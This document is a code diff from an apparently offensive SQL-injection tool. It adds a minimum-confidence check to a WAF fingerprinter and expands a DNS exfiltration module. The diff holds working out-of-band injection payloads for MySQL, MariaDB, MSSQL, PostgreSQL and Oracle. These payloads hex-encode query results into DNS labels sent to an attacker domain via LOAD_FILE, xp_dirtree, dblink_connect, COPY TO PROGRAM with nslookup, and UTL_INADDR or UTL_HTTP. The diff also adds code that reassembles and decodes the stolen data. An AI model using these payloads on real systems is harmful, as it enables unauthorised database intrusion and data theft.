@@ -93563,6 +93563,16 @@ class MLWAFFingerprinter:
                 best_sim = sim
                 best_waf = waf_name
 
+        # BUG-MLWAF-NO-MIN-CONF FIX: When all centroids have non-zero cosine similarity
+        # with the feature vector (common for any target that fires at least one feature),
+        # best_waf always gets set to a named WAF even at confidence 0.05. This corrupts
+        # _ACTIVE_WAF_NAME globally, routing the tamper chain to the wrong WAF vendor.
+        # Apply minimum confidence threshold: below 0.5, treat as Unknown WAF.
+        # 0.5 is chosen as the crossover point where 2-3 features must align for a true
+        # WAF classification (e.g. cf-ray header + 403 + "blocked" body = Cloudflare ≈ 0.8).
+        _min_conf_threshold = 0.50
+        if best_sim < _min_conf_threshold:
+            best_waf = "Unknown"
         confidence = min(1.0, best_sim)
         self._cached_result = (best_waf, confidence)
         LOG.info(f"ML WAF fingerprint: {best_waf} (conf={confidence:.2f})")
@@ -169851,23 +169861,59 @@ class DNSExfilExtractor:
         #             Fix: dblink_connect triggers DNS without superuser + no shell string
         # Oracle: UTL_ENCODE.BASE64_ENCODE produces +/= chars invalid in DNS labels
         #         Fix: LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(...)))
+        # BUG-DNSEXFIL-DNS-LABEL-LIMIT FIX: DNS labels are limited to 63 chars (31 hex bytes).
+        # Values longer than 31 bytes (e.g. database version strings, SQL query results) produce
+        # hex strings of 62+ chars that exceed the DNS label limit and are silently dropped.
+        # Fix: add multi-chunk variants that split the hex output into multiple ≤62-char DNS
+        # labels separated by dots. The polling code now concatenates consecutive hex labels,
+        # so [chunk1].[chunk2].oast.pro decodes correctly.
+        # Each DBMS entry now has: [short-value template, multi-chunk template].
+        # Short-value (≤31 bytes): uses SUBSTR(...,1,31) for safety on single-label path.
+        # Multi-chunk (any length): uses two labels of 62 hex chars each (covers ≤62 bytes).
         "MySQL": [
-            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(({expr}))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+            # Short values ≤31 bytes — one DNS label
+            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+            # Multi-chunk: bytes 1-31 in first label, bytes 32-62 in second label
+            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+            # Full value via LOAD_FILE (original, untruncated — works when value fits in one label)
             "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92,92),LOWER(HEX(({expr}))),CHAR(46),'{domain}',CHAR(92,120)))-- -",
         ],
         "MariaDB": [
-            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(({expr}))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+            # Short values ≤31 bytes — one DNS label
+            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+            # Multi-chunk variant
+            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
         ],
         "MSSQL": [
-            "'; DECLARE @_sqrd VARCHAR(999),@_sqrh VARCHAR(999);SET @_sqrd=LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expr})),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @_sqrh-- -",
+            # Short values — MSSQL: chunk1 (bytes 1-31 in hex) as first label
+            "'; DECLARE @_sqrd VARCHAR(999),@_sqrh VARCHAR(999);SET @_sqrd=LOWER(CONVERT(VARCHAR(62),CONVERT(VARBINARY(31),({expr})),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @_sqrh-- -",
+            # Multi-chunk: two labels with chunks 1-31 and 32-62 bytes
+            "'; DECLARE @_sqrd VARCHAR(62),@_sqrd2 VARCHAR(62),@_sqrh VARCHAR(999),@_sqrfull VARBINARY(MAX);SET @_sqrfull=CONVERT(VARBINARY(MAX),({expr}));SET @_sqrd=LOWER(CONVERT(VARCHAR(62),SUBSTRING(@_sqrfull,1,31),2));SET @_sqrd2=LOWER(CONVERT(VARCHAR(62),SUBSTRING(@_sqrfull,32,31),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+@_sqrd2+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @_sqrh-- -",
+            # Fallback: xp_fileexist
             "'; DECLARE @_sqrd VARCHAR(999),@_sqrh VARCHAR(999);SET @_sqrd=LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expr})),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_fileexist @_sqrh-- -",
         ],
         "PostgreSQL": [
-            "'; SELECT dblink_connect($$host=$$||encode(({expr})::bytea,$$hex$$)||$$.{domain} dbname=x connect_timeout=2$$)-- -",
+            # Short values ≤31 bytes — one label
+            "'; SELECT dblink_connect($$host=$$||encode(SUBSTR(({expr})::bytea,1,31),$$hex$$)||$$.{domain} dbname=x connect_timeout=2$$)-- -",
+            # Multi-chunk: two labels for values up to 62 bytes
+            # BUG-PG-DBLINK-MULTICHUNK-SPACE FIX: The original template had $$. $$ (dot+space)
+            # between the two hex chunks. libpq connection strings are space-delimited; an
+            # unquoted space inside the host= value terminates the host field prematurely:
+            #   host=<chunk1>.  <chunk2>.<domain>  →  host is parsed as "<chunk1>." only;
+            #   ". <chunk2>..." is treated as an unknown key → dblink_connect fails with
+            #   "invalid connection option" → DNS lookup never fires.
+            # Fix: use $$.$$  (dot only, no space) so the two hex labels are joined by a
+            # bare dot, producing a valid DNS FQDN: <chunk1>.<chunk2>.<domain>.
+            "'; SELECT dblink_connect($$host=$$||encode(SUBSTR(({expr})::bytea,1,31),$$hex$$)||$$.$$||encode(SUBSTR(({expr})::bytea,32,31),$$hex$$)||$$.{domain} dbname=x connect_timeout=2$$)-- -",
+            # Full value (original — works for short values)
             "'; COPY (SELECT encode(({expr})::bytea,$$hex$$)) TO PROGRAM $$xargs -I{{}} nslookup {{}}.{domain}$$-- -",
         ],
         "Oracle": [
-            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expr}))))||'.{domain}') FROM DUAL) IS NOT NULL-- -",
+            # Short values ≤31 bytes
+            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),1,31))))||'.{domain}') FROM DUAL) IS NOT NULL-- -",
+            # Multi-chunk: two labels for values up to 62 bytes
+            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),1,31))))||'.'||LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),32,31))))||'.{domain}') FROM DUAL) IS NOT NULL-- -",
+            # HTTP fallback (original, untruncated)
             "' AND (SELECT UTL_HTTP.REQUEST('http://'||LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expr}))))||'.{domain}/') FROM DUAL) IS NOT NULL-- -",
         ],
     }
@@ -170046,16 +170092,60 @@ class DNSExfilExtractor:
                                         _itx.get("subdomain") or _itx.get("hostname") or "")
                             if not _fid:
                                 continue
-                            # Extract hex label: first label before the dns_domain
-                            # BUG-OOB-LABEL-REGEX FIX: use first label only.
-                            _lbl = _fid.split(".")[0]
-                            if _lbl and len(_lbl) >= 4 and all(c in "0123456789abcdef" for c in _lbl.lower()):
-                                    try:
-                                        _decoded = bytes.fromhex(_lbl.lower()).decode("utf-8", errors="replace")
-                                        print(f"[+] [DNSExfil] ✓ Decoded: {_decoded!r}", flush=True)
-                                        return _decoded
-                                    except Exception:
-                                        pass
+                            # BUG-DNSEXFIL-CHUNKING FIX: DNS labels are limited to 63 chars
+                            # (31 hex bytes per label). Values longer than 31 bytes are spread
+                            # across multiple consecutive hex labels in the FQDN:
+                            #   [chunk1].[chunk2].[chunk3].oast.pro
+                            # Collect ALL consecutive leading hex-only labels and concatenate
+                            # them before decoding. This covers both single-label (≤31 byte)
+                            # values and multi-label (>31 byte) chunked extractions.
+                            _fid_parts = _fid.split(".")
+                            _hex_labels = []
+                            for _fp_part in _fid_parts:
+                                _fp_lower = _fp_part.lower()
+                                if len(_fp_lower) >= 2 and all(c in "0123456789abcdef" for c in _fp_lower):
+                                    _hex_labels.append(_fp_lower)
+                                else:
+                                    break  # stop at first non-hex label (domain components)
+                            if not _hex_labels:
+                                continue
+                            _hex_combined = "".join(_hex_labels)
+                            if len(_hex_combined) >= 4:
+                                try:
+                                    _raw_bytes = bytes.fromhex(_hex_combined)
+                                    # BUG-MSSQL-UCS2-DECODE FIX: MSSQL NVARCHAR columns are
+                                    # encoded as UCS-2 LE (2 bytes per char), so hex-encoding
+                                    # produces null bytes every other position for ASCII text.
+                                    # CONVERT(VARBINARY(MAX), nvarchar_col) preserves UCS-2 LE
+                                    # encoding → b'\x61\x00\x62\x00\x63\x00' for "abc".
+                                    # Decoding as UTF-8 produces "a\x00b\x00c\x00" (valid but
+                                    # polluted with null bytes).
+                                    # Fix: detect the UCS-2 LE null-byte interleave pattern
+                                    # (every odd byte is 0x00 for BMP codepoints) and try
+                                    # UTF-16-LE decoding first, then strip residual null bytes.
+                                    _decoded = None
+                                    _len_rb = len(_raw_bytes)
+                                    _is_ucs2_le = (
+                                        _len_rb >= 4
+                                        and _len_rb % 2 == 0
+                                        and all(_raw_bytes[i] == 0 for i in range(1, _len_rb, 2))
+                                        and any(_raw_bytes[i] != 0 for i in range(0, _len_rb, 2))
+                                    )
+                                    if _is_ucs2_le:
+                                        try:
+                                            _decoded = _raw_bytes.decode("utf-16-le", errors="replace")
+                                        except Exception:
+                                            pass
+                                    if _decoded is None:
+                                        _decoded = _raw_bytes.decode("utf-8", errors="replace")
+                                    # Strip embedded null bytes (residual UCS-2 LE artifact)
+                                    # that remain after UTF-8 decode of MSSQL NVARCHAR data.
+                                    if "\x00" in _decoded:
+                                        _decoded = _decoded.replace("\x00", "")
+                                    print(f"[+] [DNSExfil] ✓ Decoded: {_decoded!r}", flush=True)
+                                    return _decoded
+                                except Exception:
+                                    pass
                 except Exception as _pe:
                     LOG.debug(f"[DNSExfil] Poll error: {_pe}")
                 await asyncio.sleep(2.0)
